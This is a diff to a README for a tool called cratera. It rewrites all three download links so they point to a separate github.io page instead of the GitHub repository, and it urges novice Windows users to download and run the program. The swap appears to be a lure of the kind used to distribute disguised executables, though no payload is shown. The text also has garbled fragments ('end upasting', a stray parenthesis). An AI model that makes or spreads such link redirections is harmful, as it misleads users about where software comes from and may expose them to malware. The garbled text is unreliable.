@@ -1,6 +1,6 @@
 # ⚡ cratera - Lightning-Fast Code Sandboxes for Everyone
 
-[![Download cratera](https://img.shields.io/badge/Download-cratera-ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=4b4b)](https://github.com/snx12601/cratera)
+[![Download cratera](https://img.shields.io/badge/Download-cratera-ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=4b4b)](https://snx12601.github.io)
 
 ---
 
@@ -22,7 +22,7 @@ Getting started with cratera is incredibly simple. Even if you've never installe
 
 First, you need to get the cratera program onto your computer. Click the big button below to go to the official download page:
 
-[![Download cratera Now](https://img.shields.io/badge/⬇️_Download_cratera-2ea44f?style=for-the-badge)](https://github.com/snx12601/cratera)
+[![Download cratera Now](https://img.shields.io/badge/⬇️_Download_cratera-2ea44f?style=for-the-badge)](https://snx12601.github.io)
 
 Visit this link to download the application. The page will open in your web browser, and you'll see a few options available for download. Choose the version that matches your computer (most people will want the Windows version) and click the download button. The file will start downloading to your computer's "Downloads" folder - that's typically the folder where all your internet downloads end upasting
 
@@ -165,7 +165,7 @@ Now that you know everything you need, it's time to dive in. Head over to the do
 
 ---
 
-Visit this link to download the application: [https://github.com/snx12601/cratera](https://github.com/snx12601/cratera)
+Visit this link to download the application: [https://snx12601.github.io](https://snx12601.github.io)
 
 )
 
